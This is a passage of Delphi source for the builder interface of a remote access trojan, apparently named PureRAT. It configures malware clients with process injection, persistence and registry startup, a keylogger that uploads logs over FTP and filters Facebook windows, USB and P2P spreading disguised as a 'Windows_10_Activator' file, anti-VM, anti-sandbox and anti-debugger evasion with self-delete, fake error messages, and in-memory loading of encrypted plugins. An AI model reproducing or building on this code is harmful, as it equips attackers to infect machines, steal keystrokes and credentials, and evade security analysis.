    MessageBox(Handle, PChar('Profile "' + TmpStr + '" not found.'),  PROGRAMINFOS, MB_ICONERROR);
    Exit;
  end;

  JSONConfig := TJSONConfig.Create(TmpStr, PROGRAMPASSWORD);
  JSONConfig.LoadConfig;

  TmpStr := JSONConfig.ReadString('Group id');
  cbbGroup.Text := Copy(TmpStr, 1, Pos(':', TmpStr) - 1);
  Delete(TmpStr, 1, Pos(':', TmpStr));
  cbbIcon.ItemIndex := StrToInt(TmpStr);
  edtId.Text := JSONConfig.ReadString('Client id');
  TmpStr := edtId.Text;
  chk4.Checked := Pos('_%RANDOMID%', TmpStr) > 0;
  edtPassword.Text := JSONConfig.ReadString('Password');
  cbbInjection.ItemIndex := JSONConfig.ReadInteger('Inject');
  cbbInjectionChange(Sender);
  if cbbInjection.ItemIndex = 2 then
  edtProcessname.Text := JSONConfig.ReadString('Inject path');
  HostList := JSONConfig.ReadString('Connection host');
  seDelay.Value := JSONConfig.ReadInteger('Connection delay');
  chkInstall.Checked := JSONConfig.ReadBool('Installation');
  chkInstallClick(Sender);
  cbbDestination.ItemIndex := JSONConfig.ReadInteger('Destination');
  cbbDestinationChange(Sender);
  edtDestination.Text := JSONConfig.ReadString('Custom path');
  edtFolder.Text := JSONConfig.ReadString('Folder');
  edtFilename.Text := JSONConfig.ReadString('Filename');
  chkMelt.Checked := JSONConfig.ReadBool('Melt');
  chkHide.Checked := JSONConfig.ReadBool('Hide');
  chkKeylogger.Checked := JSONConfig.ReadBool('Keylogger');
  chkFtplogsClick(Sender);
  chkReboot.Checked := JSONConfig.ReadBool('Reboot');
  chkPersistence.Checked := JSONConfig.ReadBool('Persistence');
  chkDate.Checked := JSONConfig.ReadBool('Creation date');
  chkUSB.Checked := JSONConfig.ReadBool('USB');
  chkUSBClick(Sender);
  chkP2P.Checked := JSONConfig.ReadBool('P2P');
  chkP2PClick(Sender);
  edtSpreading.Text := JSONConfig.ReadString('Spread filename1');
  edt1.Text := JSONConfig.ReadString('Spread filename2');
  chkRegStartup.Checked := JSONConfig.ReadBool('Registry startup');
  chkRegStartupClick(Sender);
  chkHKCU.Checked := JSONConfig.ReadBool('HKCU');
  chkHKLM.Checked := JSONConfig.ReadBool('HKLM');
  chkPolicies.Checked := JSONConfig.ReadBool('Policies');
  chkRun.Checked := JSONConfig.ReadBool('RunOnce');
  edtAX.Text := JSONConfig.ReadString('ActiveX');
  chkAX.Checked := edtAX.Text <> '';
  chkAXClick(Sender);
  edtKeyname.Text := JSONConfig.ReadString('Key name');
  chkVM.Checked := JSONConfig.ReadBool('Anti VM');
  chkSB.Checked := JSONConfig.ReadBool('Anti sandboxie');
  chkDG.Checked := JSONConfig.ReadBool('Anti debugger');
  chkPA.Checked := JSONConfig.ReadBool('Anti PA');                     
  cbbTodo.ItemIndex := JSONConfig.ReadInteger('Anti Todo');
  chkFakemsg.Checked := JSONConfig.ReadBool('Fake message');
  chkFakemsgClick(Sender);
  edtTitle.Text := JSONConfig.ReadString('Message title');
  redtBody.Text := JSONConfig.ReadString('Message text');
  rgIcon.ItemIndex := JSONConfig.ReadInteger('Message type');
  rgButton.ItemIndex := JSONConfig.ReadInteger('Message buttons');
  chkFtplogs.Checked := JSONConfig.ReadBool('Keylogs upload');
  edtFtphost.Text := JSONConfig.ReadString('Ftp host');
  edtFtpUser.Text := JSONConfig.ReadString('Ftp user');
  edtFtpPass.Text := JSONConfig.ReadString('Ftp pass');
  edtFtpDir.Text := JSONConfig.ReadString('Ftp directory');
  seFtpPort.Value := JSONConfig.ReadInteger('Ftp port');
  se2.Value := JSONConfig.ReadInteger('Keylogs size');
  se1.Value := JSONConfig.ReadInteger('Keylogs delay');
  edtWindows.Text := JSONConfig.ReadString('Windows filter');
  rgCompression.ItemIndex := JSONConfig.ReadInteger('Compression');
  chk12.Checked := JSONConfig.ReadBool('Autosave');
  JSONConfig.Free;

  SetHostList(HostList);
  ShowProfile;
  pnlProfile.BringToFront;
end;

procedure TFormBuilder.S1Click(Sender: TObject);
var
  TmpStr, TmpStr1: string;
begin
  if not Assigned(lv1.Selected) then Exit;
  TmpStr := InputBox('Rename profile', 'New name', lv1.Selected.Caption);
  if (TmpStr = '') or (TmpStr = lv1.Selected.Caption) then Exit;

  TmpStr1 := ExtractFilePath(ParamStr(0)) + 'Profiles';
  if RenameFile(TmpStr1 + '\' + lv1.Selected.Caption + '.profile',
    TmpStr1 + '\' + TmpStr + '.profile')
  then lv1.Selected.Caption := TmpStr
  else MessageBox(Handle, 'Failed to rename profile.', PROGRAMINFOS, MB_ICONERROR);
end;

procedure TFormBuilder.chkAsmClick(Sender: TObject);
begin
  grp2.Visible := chkAsm.Checked;
end;

//By Andreas Rejbrand from http://stackoverflow.com/questions/5539316/how-can-i-read-details-of-file
//-----
function TFormBuilder.GetVersionData(const FileName: string): Boolean;
type
  PLandCodepage = ^TLandCodepage;
  TLandCodepage = record
    wLanguage, wCodePage: word;
  end;
var
  dummy, len: cardinal;
  buf, pntr: pointer;
  lang: string;
begin
  Result := True;
  len := GetFileVersionInfoSize(PChar(FileName), dummy);
  if len = 0 then Exit;
  GetMem(buf, len);
  try
    if not GetFileVersionInfo(PChar(FileName), 0, len, buf) then Exit;
    if not VerQueryValue(buf, '\VarFileInfo\Translation\', pntr, len) then Exit;
    lang := Format('%.4x%.4x', [PLandCodepage(pntr)^.wLanguage, PLandCodepage(pntr)^.wCodePage]);

    if VerQueryValue(buf, PChar('\StringFileInfo\' + lang + '\CompanyName'), pntr, len) then edtComp.Text := PChar(pntr);
    if VerQueryValue(buf, PChar('\StringFileInfo\' + lang + '\FileDescription'), pntr, len) then edtDesc.Text := PChar(pntr);
    if VerQueryValue(buf, PChar('\StringFileInfo\' + lang + '\FileVersion'), pntr, len) then edtFVer.Text := PChar(pntr);
    if VerQueryValue(buf, PChar('\StringFileInfo\' + lang + '\InternalName'), pntr, len) then edtName.Text := PChar(pntr);
    if VerQueryValue(buf, PChar('\StringFileInfo\' + lang + '\LegalCopyright'), pntr, len) then edtCopy.Text := PChar(pntr);
    if VerQueryValue(buf, PChar('\StringFileInfo\' + lang + '\LegalTrademarks'), pntr, len) then edtTrade.Text := PChar(pntr);
    if VerQueryValue(buf, PChar('\StringFileInfo\' + lang + '\OriginalFileName'), pntr, len) then edtOName.Text := PChar(pntr);
    if VerQueryValue(buf, PChar('\StringFileInfo\' + lang + '\ProductName'), pntr, len) then edtPName.Text := PChar(pntr);
    if VerQueryValue(buf, PChar('\StringFileInfo\' + lang + '\ProductVersion'), pntr, len) then edtPVer.Text := PChar(pntr);
    if VerQueryValue(buf, PChar('\StringFileInfo\' + lang + '\Comments'), pntr, len) then edtCmt.Text := PChar(pntr);
    if VerQueryValue(buf, PChar('\StringFileInfo\' + lang + '\PrivateBuild'), pntr, len) then edtPBuild.Text := PChar(pntr);
    if VerQueryValue(buf, PChar('\StringFileInfo\' + lang + '\SpecialBuild'), pntr, len) then edtSBuild.Text := PChar(pntr);
  finally
    FreeMem(buf);
  end;

  Result := True;
end;
//-----

procedure TFormBuilder.btn10Click(Sender: TObject);
begin
  if not chkAsm.Checked then Exit;
  dlgOpen1.InitialDir := ExtractFilePath(ParamStr(0));
  dlgOpen1.Filter := 'Executable file (*.exe); DLL file (*.dll)|*.exe; *.dll';
  if (not dlgOpen1.Execute) and (not FileExists(dlgOpen1.FileName)) then Exit;
  if not GetVersionData(dlgOpen1.FileName) then
  MessageBox(Handle, 'Failed to get file assembly.', PROGRAMINFOS, MB_ICONERROR);
end;

procedure TFormBuilder.AddLog(Log: string; lColor: TColor);
var
  TmpItem: TListItem;
begin
  TmpItem := lvLogs.Items.Add;
  TmpItem.Caption := TimeToStr(Now);
  TmpItem.SubItems.Add(Log);
  if lColor = clGreen then TmpItem.ImageIndex := 19 else
  if lColor = clRed then TmpItem.ImageIndex := 20 else TmpItem.ImageIndex := -1;
  TmpItem.Data := TObject(lColor);
  SendMessage(lvLogs.Handle, WM_VSCROLL, SB_LINEDOWN, 0);
end;

procedure TFormBuilder.btn11Click(Sender: TObject);
var
  TmpStr: string;
begin
  TmpStr := WanAddress;
  if TmpStr = '127.0.0.1' then
  begin
    MessageBox(Handle, 'Failed to retrieve WAN ip address.', PROGRAMINFOS, MB_ICONERROR);
    TmpStr := LocalAddress;
  end;

  edtHost.Text := TmpStr;
end;

procedure TFormBuilder.chk3Click(Sender: TObject);
begin
  if not Assigned(lvPlugin.Selected) then Exit;
  TFileOptions(lvPlugin.Selected.Data).Execute := chk3.Checked;
end;

procedure TFormBuilder.lvPluginSelectItem(Sender: TObject; Item: TListItem;
  Selected: Boolean);
begin
  if not Item.Selected then Exit;
  if Item.Data <> nil then chk3.Checked := TFileOptions(Item.Data).Execute;
end;

procedure TFormBuilder.cbbGroupChange(Sender: TObject);
begin
  case cbbGroup.ItemIndex of
    0: cbbIcon.ItemIndex := 0;
    1: cbbIcon.ItemIndex := 4;
    2: cbbIcon.ItemIndex := 3;
    3: cbbIcon.ItemIndex := 2;
    4: cbbIcon.ItemIndex := 5;
  end;
end;

procedure TFormBuilder.btn13Click(Sender: TObject);
begin
  if ProfileConfig = '' then
  begin
    MessageBox(Handle, 'Client not built.', PROGRAMINFOS, MB_ICONERROR);
    Exit;
  end;

  pnlPlugins.BringToFront;
end;

procedure TFormBuilder.AddPlugin(pPath: string);
var
  Module: PBTMemoryModule;
  TmpItem: TListItem;
  TmpList: TStringArray;
  Buffer, TmpStr, TmpStr1: string;
  p: Pointer;
  PluginInfos: function(): PChar;
  BufferSize: Int64;
  jpg: TJPEGImage;
  Bmp: TBitmap;
  Stream: TMemoryStream;
begin
  Buffer := FileToStr(pPath);
  BufferSize := StrToInt(Copy(Buffer, 1, Pos('|', Buffer) - 1));
  Delete(Buffer, 1, Pos('|', Buffer));
  TmpStr1 := Copy(Buffer, 1, BufferSize);                  
  Delete(Buffer, 1, BufferSize); 
  Buffer := EnDecryptText(Buffer, PROGRAMPASSWORD);
  p := @Buffer[1];

  try
    Module := BTMemoryLoadLibary(p, Length(Buffer));
    @PluginInfos := BTMemoryGetProcAddress(Module, 'PluginInfos');
    if Assigned(PluginInfos) then TmpStr := PluginInfos();
    TmpList := ParseString('|', TmpStr);

    lvPlugins.Items.BeginUpdate;

    TmpItem := lvPlugins.Items.Add;
    TmpItem.Caption := pPath;
    TmpItem.SubItems.Add(TmpList[0]);
    TmpItem.SubItems.Add(TmpList[1]);
    TmpItem.SubItems.Add(TmpList[2]);
    TmpItem.SubItems.Add(TmpList[3]);

    Stream := TMemoryStream.Create;
    Stream.Write(Pointer(TmpStr1)^, Length(TmpStr1));
    Stream.Position := 0;

    try
      Jpg := TJPEGImage.Create;
      Jpg.LoadFromStream(Stream);
      Stream.Free;
      Bmp := TBitmap.Create;
      Bmp.Width := Jpg.Width;
      Bmp.Height := Jpg.Height;
      Bmp.Canvas.Draw(0, 0, Jpg);
      Jpg.Free;
    except
      Stream.Free;
      Jpg.Free;
      Bmp.Free;
      Exit;
    end;

    TmpItem.ImageIndex := il3.Add(Bmp, nil);
    Bmp.Free;

    lvPlugins.Items.EndUpdate;
  finally
    BTMemoryFreeLibrary(Module);
  end;
end;

procedure TFormBuilder.MenuItem2Click(Sender: TObject);
var
  Module: PBTMemoryModule;
  Buffer: string;
  p: Pointer;
  PluginFunction: procedure();
  PluginOptions: procedure(_ClientPath: PChar); stdcall;
  BufferSize: Int64;
begin
  if not Assigned(lvPlugins.Selected) then Exit;

  Buffer := FileToStr(lvPlugins.Selected.Caption);
  BufferSize := StrToInt(Copy(Buffer, 1, Pos('|', Buffer) - 1));
  Delete(Buffer, 1, Pos('|', Buffer));
  Delete(Buffer, 1, BufferSize);
  Buffer := EnDecryptText(Buffer, PROGRAMPASSWORD);
  p := @Buffer[1];

  try
    Module := BTMemoryLoadLibary(p, Length(Buffer));
    @PluginOptions := BTMemoryGetProcAddress(Module, 'PluginOptions');
    if Assigned(PluginOptions) then PluginOptions(PChar(ClientFile));

    @PluginFunction := BTMemoryGetProcAddress(Module, 'PluginFunction');
    if Assigned(PluginFunction) then PluginFunction;
  finally
    BTMemoryFreeLibrary(Module);
  end;
end;

procedure TFormBuilder.lvPluginsDblClick(Sender: TObject);
begin
  MenuItem2Click(Sender);
end;

procedure TFormBuilder.btn12Click(Sender: TObject);
begin
  if ProfileConfig = '' then
  begin
    MessageBox(Handle, 'Client not built.', PROGRAMINFOS, MB_ICONERROR);
    Exit;
  end;

  dlgSave1.InitialDir := ExtractFilePath(ParamStr(0)) + 'Profiles';
  dlgSave1.Filter := 'Configuration file (*.config)|*.config';
  dlgSave1.DefaultExt := 'config';
  dlgSave1.FileName := ExtractFilePath(ParamStr(0)) + ProfileName + '.config';
  if (not dlgSave1.Execute) or (dlgSave1.FileName = '') then Exit;
  
  lvLogs.Clear;
  AddLog('Generating configuration file...');
  MyCreateFile(dlgSave1.FileName, ProfileConfig, Length(ProfileConfig));
  AddLog('Done -> final size: ' + FileSizeToStr(MyGetFileSize(dlgSave1.FileName)), clGreen);
end;

procedure TFormBuilder.lvPluginClick(Sender: TObject);
begin
  if not Assigned(lvPlugin.Selected) then chk3.Checked := False;
end;

procedure TFormBuilder.chk4Click(Sender: TObject);
var
  Tmpstr: string;
begin
  Tmpstr := edtId.Text;

  if not chk4.Checked then edtId.Text := MyReplaceStr(Tmpstr, '_%RANDOMID%', '')
  else
  begin
    if Pos('_%RANDOMID%', TmpStr) > 0 then Exit;       
    edtId.Text := edtId.Text + '_%RANDOMID%';
  end;
end;

procedure TFormBuilder.T1Click(Sender: TObject);
begin
  if not Assigned(lv2.Selected) then Exit;

  if TestHost(lv2.Selected.Caption, StrToInt(lv2.Selected.SubItems[0])) then
  begin
    lv2.Selected.SubItems[1] := 'Alive';
    lv2.Selected.ImageIndex := 14;
  end
  else
  begin
    lv2.Selected.SubItems[1] := 'Dead';
    lv2.Selected.ImageIndex := 15;
  end;
end;

procedure TFormBuilder.btn14Click(Sender: TObject);
var
  TmpItem: TListItem;
begin
  if not Assigned(lv2.Selected) then Exit;
  if lv2.Selected.Index = 0 then Exit;

  lv2.Items.BeginUpdate;

  TmpItem := TListItem.Create(lv2.Items);
  TmpItem := lv2.Items.Insert(lv2.Selected.Index - 1);
  TmpItem.Caption := lv2.Selected.Caption;
  TmpItem.SubItems.Add(lv2.Selected.SubItems[0]);
  TmpItem.SubItems.Add(lv2.Selected.SubItems[1]);
  TmpItem.ImageIndex := lv2.Selected.ImageIndex;
  lv2.Selected.Delete;
  TmpItem.Selected := True;

  lv2.Items.EndUpdate;
end;

procedure TFormBuilder.btn15Click(Sender: TObject);
var
  TmpItem: TListItem;
begin
  if not Assigned(lv2.Selected) then Exit;
  if lv2.Selected.Index = lv2.Items.Count - 1 then Exit;
               
  lv2.Items.BeginUpdate;      

  TmpItem := TListItem.Create(lv2.Items);
  TmpItem := lv2.Items.Insert(lv2.Selected.Index + 2);
  TmpItem.Caption := lv2.Selected.Caption;
  TmpItem.SubItems.Add(lv2.Selected.SubItems[0]);
  TmpItem.SubItems.Add(lv2.Selected.SubItems[1]);
  TmpItem.ImageIndex := lv2.Selected.ImageIndex;
  lv2.Selected.Delete;
  TmpItem.Selected := True;

  lv2.Items.EndUpdate;
end;

procedure TFormBuilder.FormShow(Sender: TObject);
begin
  R3Click(Sender);
end;

procedure TFormBuilder.btn17Click(Sender: TObject);
const
  MsgInfo =
    '- Anti Virtual machines: ' + #13#10 +
    'Virtuals machines allowed are Virtual PC, VMWare and Virtual box.' + #13#10#13#10 +
    '- Anti Debuggers: ' + #13#10 +
    'Debuggers allowed are Soft ice, OllyDBG, Syser debugger and unknown debuggers process.' + #13#10#13#10 +
    '- Anti Sandboxies: ' + #13#10 +
    'Sandboxies allowed are Avast sandboxie, ThreadExpert, Anubis, CW Sandbox, Joe box and Norman sandbox.' + #13#10#13#10 +
    '- Anti Process analysers: ' + #13#10 +
    'They concern Windows tasks manager and Wireshark process.' + #13#10#13#10 +
    '- To do: ' + #13#10 +
    'Self delete means that if one of the situations above is encounter the' + #13#10 +
    'client will delete itself automatically, in other case the client process' + #13#10 +
    'will just stop.';
begin
  MessageBox(Handle, MsgInfo, PROGRAMINFOS, MB_ICONINFORMATION);
end;

procedure TFormBuilder.btn18Click(Sender: TObject);
begin
  if ProfileConfig = '' then
  begin
    MessageBox(Handle, 'Client not built.', PROGRAMINFOS, MB_ICONERROR);
    Exit;
  end;
         
  if cbb2.ItemIndex = -1 then  Exit;

  lvLogs.Clear;
  dlgSave1.InitialDir := ExtractFilePath(ParamStr(0));
  
  case cbb2.ItemIndex of
    1:  begin
          dlgSave1.Filter := 'Pascal source file (*.pas)|*.pas';
          dlgSave1.DefaultExt := 'pas';
          dlgSave1.FileName := '';
          if (not dlgSave1.Execute) or (dlgSave1.FileName = '') then Exit;
          GenerateBytesArray(dlgSave1.FileName, 'pas');
        end;
    0:  begin
          dlgSave1.Filter := 'C header file (*.h)|*.h';
          dlgSave1.DefaultExt := 'h';
          dlgSave1.FileName := '';
          if (not dlgSave1.Execute) or (dlgSave1.FileName = '') then Exit;
          GenerateBytesArray(dlgSave1.FileName, 'h');
        end;
    2:  begin
          dlgSave1.Filter := 'Source file (*.inc)|*.inc';
          dlgSave1.DefaultExt := 'inc';
          dlgSave1.FileName := '';
          if (not dlgSave1.Execute) or (dlgSave1.FileName = '') then Exit;
          GenerateBytesArray(dlgSave1.FileName, 'inc');
        end;  
    3:  begin
          dlgSave1.Filter := 'Python source file (*.py)|*.py';
          dlgSave1.DefaultExt := 'py';
          dlgSave1.FileName := '';
          if (not dlgSave1.Execute) or (dlgSave1.FileName = '') then Exit;
          GenerateBytesArray(dlgSave1.FileName, 'py');
        end;
  end;
end;

procedure TFormBuilder.btn19Click(Sender: TObject);
var
  TmpStr: string;
  TmpItem: TListItem;
begin
  if not DirectoryExists(ExtractFilePath(ParamStr(0)) + 'Profiles') then
  CreateDir(ExtractFilePath(ParamStr(0)) + 'Profiles');
  if not InputQuery('New profile', 'Profile name', TmpStr) then Exit;
  if not CheckValidName(TmpStr, '.') then Exit;

  TmpItem := lv1.Items.Add;
  TmpItem.Caption := TmpStr;
  TmpItem.ImageIndex := 0;

  cbbGroup.Text := 'Default';
  cbbIcon.ItemIndex := 0;
  edtId.Text := TmpStr;
  edtPassword.Text := 'wrh1d3';
  cbbInjection.ItemIndex := 3;
  cbbInjectionChange(Sender);
  HostList := '127.0.0.1:80|';
  SetHostList(HostList);
  seDelay.Value := 1;
  chkInstall.Checked := False;
  chkInstallClick(Sender);
  cbbDestination.ItemIndex := 4;
  cbbDestinationChange(Sender);
  edtDestination.Text := 'Temp';
  edtFolder.Text := 'PureRAT';
  edtFilename.Text := 'Client';
  chkMelt.Checked := False;
  chkHide.Checked := False;
  chkKeylogger.Checked := False;
  chkFtplogsClick(Sender);    
  chkScrlogger.Checked := False;
  chkReboot.Checked := False;
  chkPersistence.Checked := False;
  chkDate.Checked := False;
  chkUSB.Checked := False;
  chkUSBClick(Sender);
  chkP2P.Checked := False;
  chkP2PClick(Sender);
  edtSpreading.Text := 'Windows_10_Activator_v3.0';
  edt1.Text := 'Windows_10_Activator_v3.0.exe,';
  chkRegStartup.Checked := False;
  chkRegStartupClick(Sender);
  chkHKCU.Checked := True;
  chkHKLM.Checked := True;
  chkPolicies.Checked := True;
  chkRun.Checked := True;
  edtAX.Text := '';
  chkAX.Checked := edtAX.Text <> '';
  chkAXClick(Sender);
  edtKeyname.Text := TmpStr;
  chkVM.Checked := False;
  chkSB.Checked := False;
  chkDG.Checked := False;
  chkPA.Checked := False;
  cbbTodo.ItemIndex := -1;
  chkFakemsg.Checked := False;
  chkFakemsgClick(Sender);
  edtTitle.Text := 'Error';
  redtBody.Text := 'This application is not a valid win32 application.';
  rgIcon.ItemIndex := 0;
  rgButton.ItemIndex := 0;
  chkFtplogs.Checked := False;
  edtFtphost.Text := FtpHost;
  edtFtpUser.Text := FtpUser;
  edtFtpPass.Text := FtpPass;
  edtFtpDir.Text := FtpDir;
  seFtpPort.Value := FtpPort;
  se2.Value := 10;
  se1.Value := 15;
  edtWindows.Text := 'facebook,';
  rgCompression.ItemIndex := 2;
  chk12.Checked := True;

  SaveProfile(TmpStr);
end;

procedure TFormBuilder.btn20Click(Sender: TObject);
const
  MsgInfo =
    '- Client extras pack: ' + #13#10 +
    'It' + '''s a set of functions needs by the Client to execute commands.';
begin
  MessageBox(Handle, MsgInfo, PROGRAMINFOS, MB_ICONINFORMATION);
end;

procedure TFormBuilder.rb1Click(Sender: TObject);
begin
  edtPluginUrl.Visible := not rb1.Checked;
end;

procedure TFormBuilder.rb2Click(Sender: TObject);
var
  TmpRes: TResourceStream;
  Stream: TMemoryStream;
begin
  dlgSave1.InitialDir := ExtractFilePath(ParamStr(0));
  dlgSave1.Filter := 'Client extras pack (*.pack)|*.pack';
  dlgSave1.DefaultExt := 'pack';
  dlgSave1.FileName := ExtractFilePath(ParamStr(0)) + 'Client.pack';

  if (not dlgSave1.Execute) or (dlgSave1.FileName = '') then
  begin
    rb2.Checked := False;
    rb1.Checked := True;
    rb1Click(Sender); 
    Exit;
  end;

  edtPluginUrl.Visible := rb2.Checked;

  TmpRes := TResourceStream.Create(HInstance, 'PLUGIN', 'pluginfile');
  Stream := TMemoryStream.Create;
  Stream.LoadFromStream(TmpRes);
  Stream.Position := 0;
  TmpRes.Free;

  Stream.SaveToFile(dlgSave1.FileName);
  Stream.Free;
  
  edtPluginUrl.Text := 'http://www.server.com/' + ExtractFileName(dlgSave1.FileName);
end;

procedure TFormBuilder.R3Click(Sender: TObject);
var
  i: Integer;
begin
  lvPlugins.Clear;
  if FormPluginsManager.lv1.Items.Count = 0 then Exit;
  for i := 0 to FormPluginsManager.lv1.Items.Count - 1 do
  begin
    Application.ProcessMessages;
    if FormPluginsManager.lv1.Items.Item[i].SubItems[0] = 'Builder' then
    AddPlugin(FormPluginsManager.lv1.Items.Item[i].Caption);
  end;
end;

procedure TFormBuilder.FormClose(Sender: TObject;
  var Action: TCloseAction);   
var
  JSONConfig: TJSONConfig;
begin
  JSONConfig := TJSONConfig.Create(WindowsSettings, PROGRAMPASSWORD);
  JSONConfig.WriteInteger('cBuilder left', Left);
  JSONConfig.WriteInteger('cBuilder top', Top);
  JSONConfig.SaveConfig;
  JSONConfig.Free;
end;

procedure TFormBuilder.Q1Click(Sender: TObject);
begin
  if not Assigned(lv1.Selected) then Exit;
  ProfileName := lv1.Selected.Caption;

  if MessageBox(Handle, 'Do you want to create mutex?', PROGRAMINFOS,
    MB_ICONQUESTION + MB_YESNO) = IDYES 
  then btn2Click(Sender);

  btn5Click(Sender);
  MessageBox(Handle, 'Done!', PROGRAMINFOS, MB_ICONINFORMATION);
end;

end.



